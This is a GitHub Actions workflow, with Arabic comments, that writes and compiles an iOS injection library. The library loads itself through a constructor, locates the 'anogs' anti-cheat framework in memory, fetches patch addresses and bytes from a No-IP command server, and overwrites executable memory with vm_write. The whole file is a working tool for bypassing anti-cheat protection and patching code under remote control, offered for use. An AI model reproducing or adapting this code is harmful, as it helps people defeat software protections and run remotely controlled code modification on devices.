name: Sovereign-NoIP-Pro-Forge
on: [push, workflow_dispatch]

jobs:
  build:
    name: "صهر سلاح البصرة السيادي"
    runs-on: macos-latest
    steps:
      - name: "تجهيز النخاع البرمجي"
        run: |
          echo "🔥 بدء تشغيل مفاعل الجنرال وسام (إحداثية: jojolmlm.hopto.org)..."
          
          # [1] المفاعل يكتب كود الـ mm السيادي مدمجاً برابط الـ No-IP المليمتري
          cat << 'EOF' > wsam_core.mm
          #import <UIKit/UIKit.h>
          #import <mach-o/dyld.h>
          #import <mach/mach.h>
          #import <Foundation/Foundation.h>

          // [🎯] إحداثيات مركز القيادة الثابتة (No-IP)
          #define SERVER_API @"http://jojolmlm.hopto.org/dashboard_v60.php?api=true"

          @interface SovereignProUI : UIView
          @property (nonatomic, strong) UILabel *statusLabel;
          @property (nonatomic, strong) UIView *statusLamp;
          @end

          @implementation SovereignProUI
          - (instancetype)initWithFrame:(CGRect)frame {
              self = [super initWithFrame:frame];
              if (self) {
                  // [التصميم الجمالي السيادي]: زجاجي أسود مع حدود سيان مشعة
                  self.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
                  self.layer.cornerRadius = 15;
                  self.layer.borderColor = [UIColor cyanColor].CGColor;
                  self.layer.borderWidth = 1.5;
                  
                  // توهج الرادار (Glow Effect)
                  self.layer.shadowColor = [UIColor cyanColor].CGColor;
                  self.layer.shadowOffset = CGSizeMake(0, 0);
                  self.layer.shadowRadius = 10;
                  self.layer.shadowOpacity = 0.6;
                  
                  // نص الحالة المليمتري
                  self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(15, 8, 190, 20)];
                  self.statusLabel.text = @"انقر مرتين للالتحام بالرادار";
                  self.statusLabel.textColor = [UIColor whiteColor];
                  self.statusLabel.font = [UIFont boldSystemFontOfSize:10.5];
                  self.statusLabel.textAlignment = NSTextAlignmentCenter;
                  [self addSubview:self.statusLabel];
                  
                  // اللمبة السيادية
                  self.statusLamp = [[UIView alloc] initWithFrame:CGRectMake(10, 12, 12, 12)];
                  self.statusLamp.backgroundColor = [UIColor whiteColor];
                  self.statusLamp.layer.cornerRadius = 6;
                  [self addSubview:self.statusLamp];
                  
                  // [تكتيك فك الانجماد]: النقر المزدوج لإعادة المحاولة
                  UITapGestureRecognizer *doubleTap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(startCloudSync)];
                  doubleTap.numberOfTapsRequired = 2;
                  [self addGestureRecognizer:doubleTap];
                  self.userInteractionEnabled = YES;

                  [self startCloudSync];
              }
              return self;
          }

          // =========================================================
          // [⚙️] محرك الحقن المليمتري (Targeting: anogs.framework)
          // =========================================================
          - (void)applyPatches:(NSArray *)payload {
              uintptr_t slide = 0;
              // البحث عن نخاع حماية "أنكوس" في الذاكرة
              uint32_t count = _dyld_image_count();
              for (uint32_t i = 0; i < count; i++) {
                  const char *name = _dyld_get_image_name(i);
                  if (name && strstr(name, "anogs.framework/anogs")) {
                      slide = _dyld_get_image_vmaddr_slide(i);
                      break;
                  }
              }
              if (slide == 0) slide = _dyld_get_image_vmaddr_slide(0);

              mach_port_t task = mach_task_self();
              for (NSDictionary *off in payload) {
                  uintptr_t addr = strtoull([off[@"address"] UTF8String], NULL, 16);
                  uintptr_t target = slide + addr;
                  NSString *hex = off[@"hex_val"];
                  
                  NSMutableData *data = [NSMutableData data];
                  for (int i = 0; i + 2 <= hex.length; i += 2) {
                      unsigned int v;
                      [[NSScanner scannerWithString:[hex substringWithRange:NSMakeRange(i, 2)]] scanHexInt:&v];
                      unsigned char c = (unsigned char)v;
                      [data appendBytes:&c length:1];
                  }
                  
                  vm_protect(task, (vm_address_t)target, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
                  vm_write(task, (vm_address_t)target, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
                  vm_protect(task, (vm_address_t)target, data.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
              }
          }

          - (void)startCloudSync {
              self.statusLabel.text = @"جاري رصد إشارة No-IP...";
              self.statusLabel.textColor = [UIColor yellowColor];
              self.statusLamp.backgroundColor = [UIColor yellowColor];

              NSURL *url = [NSURL URLWithString:SERVER_API];
              NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
              [request setValue:@"Mozilla/5.0 (Sovereign/1.0)" forHTTPHeaderField:@"User-Agent"];
              [request setTimeoutInterval:15.0];

              [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
                  dispatch_async(dispatch_get_main_queue(), ^{
                      if (error || !data) {
                          self.statusLabel.text = @"الرادار معطل! (انقر مرتين)";
                          self.statusLabel.textColor = [UIColor redColor];
                          self.statusLamp.backgroundColor = [UIColor redColor];
                          return;
                      }
                      
                      NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                      if (!json) return;
                      
                      NSString *status = json[@"system_status"];
                      NSArray *payload = json[@"payload"];

                      if ([status isEqualToString:@"safe"]) {
                          [self applyPatches:payload];
                          self.statusLabel.text = [NSString stringWithFormat:@"سيادة ثابتة ✅ | حقن %lu", (unsigned long)payload.count];
                          self.statusLabel.textColor = [UIColor greenColor];
                          self.statusLamp.backgroundColor = [UIColor greenColor];
                          self.layer.borderColor = [UIColor greenColor].CGColor;
                      } else {
                          self.statusLabel.text = json[@"notification"] ?: @"⚠️ نظام مكشوف";
                          self.statusLabel.textColor = [UIColor redColor];
                          self.statusLamp.backgroundColor = [UIColor redColor];
                      }
                  });
              }] resume];
          }
          @end

          void __attribute__((constructor)) start_sovereign_engine() {
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                  UIWindow *win = [[UIApplication sharedApplication] keyWindow];
                  if (win) {
                      CGFloat screenWidth = [UIScreen mainScreen].bounds.size.width;
                      // وضع الواجهة في أعلى المنتصف تحت الكاميرا مباشرة
                      SovereignProUI *ui = [[SovereignProUI alloc] initWithFrame:CGRectMake(screenWidth/2 - 110, 45, 220, 36)];
                      [win addSubview:ui];
                  }
              });
          }
          EOF

      - name: "مرحلة الصهر المعماري (Clang ARM64)"
        run: |
          export SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
          clang -dynamiclib -arch arm64 wsam_core.mm -o Sovereign_NoIP_Ready.dylib \
          -isysroot $SDK_PATH -framework Foundation -framework UIKit -framework CoreGraphics \
          -Wno-deprecated-declarations -fobjc-arc -lc++ -Os
          
      - name: "تسليم الغنيمة (Upload)"
        uses: actions/upload-artifact@v4
        with:
          name: Sovereign-NoIP-Dylib
          path: Sovereign_NoIP_Ready.dylib
